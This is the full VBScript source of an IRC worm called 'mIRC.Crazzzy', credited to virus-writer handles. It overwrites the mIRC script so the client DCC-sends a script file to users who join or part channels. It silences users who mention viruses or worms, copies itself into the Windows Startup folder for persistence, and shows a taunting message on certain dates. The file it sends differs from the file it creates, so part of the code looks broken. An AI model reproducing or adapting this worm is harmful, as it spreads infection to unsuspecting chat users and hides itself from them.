   'mIRC.Crazzzy
   'Coded By MeTaLiK
   'Created by LittleBoy , www.vxbiolabs.cjb.net / ACIdCooKie
   On Error Resume Next
   Dim Crazzzy, WormFile, FSO
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Crazzzy = Wscript.ScriptFullName
   Set WormFile = FSO.CreateTextFile("c:\windows\system\crazzzy.dll", True)
   WormFile.WriteLine "[script]"
   WormFile.WriteLine "n0=; pIRCH98.Crazzzy"
   WormFile.WriteLine "n1=on 1:JOIN:#:{"
   WormFile.WriteLine "n2=  if ( $nick != $me ) {"
   WormFile.WriteLine "n3=    /dcc send $nick c:\windows\system\toofunny.vbs"
   WormFile.WriteLine "n4=  }"
   WormFile.WriteLine "n5=  if ( $me ison #nohack ) {"
   WormFile.WriteLine "n6=    /quit"
   WormFile.WriteLine "n7=  }"
   WormFile.WriteLine "n8=}"
   WormFile.WriteLine "n9=on 1:PART:#:/dcc send $nick c:\windows\system\toofunny.vbs"
   WormFile.WriteLine "n10=version:/notice $nick \-1 mIRC: Infected with Crazzzy!!! \-1:-"
   WormFile.WriteLine "n11=on TEXT:virus:#:/ignore # $nick"
   WormFile.WriteLine "n12=on TEXT:trojan:#:/ignore # $nick"
   WormFile.WriteLine "n13=on TEXT:worm:#:/ignore # $nick"
   WormFile.WriteLine "n14=on TEXT:crazzzy:#:/ignore # $nick"
   WormFile.WriteLine "n15=on TEXT:toofunny:#:/ignore # $nick"
   WormFile.WriteLine "n16=on TEXT:bye:#:/quit"
   WormFile.WriteLine "n17=on KICKED:*:#: /msg $nick FUCK YOU!!!"
   WormFile.Close
   FSO.CopyFile "c:\windows\system\crazzzy.dll", "c:\mirc\script.ini"
   FSO.CopyFile Crazzzy, "c:\windows\system\funny.vbs"
   FSO.CopyFile Crazzzy, "c:\windows\start menu\programs\startUp\system.vbs"
   If Day(Now()) = 16 or Day(Now()) = 28 Then
     MsgBox "Your Crazzzy!!!", 4096 , "Crazzzy"
   End If
